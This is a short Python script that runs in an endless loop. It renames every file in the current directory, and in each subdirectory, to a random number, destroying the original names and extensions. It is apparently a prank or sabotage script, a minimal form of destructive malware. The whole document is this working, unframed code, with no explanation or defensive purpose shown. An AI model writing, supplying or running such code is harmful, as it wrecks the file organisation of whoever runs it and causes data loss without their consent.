import os
import random
while True:
    for filename in os.listdir():
        try:
            foldername = os.listdir(filename)
            for file in foldername:
                os.rename(f'{filename}\\{file}', str(random.random()))
        except NotADirectoryError:
            os.rename(filename, str(random.random()))
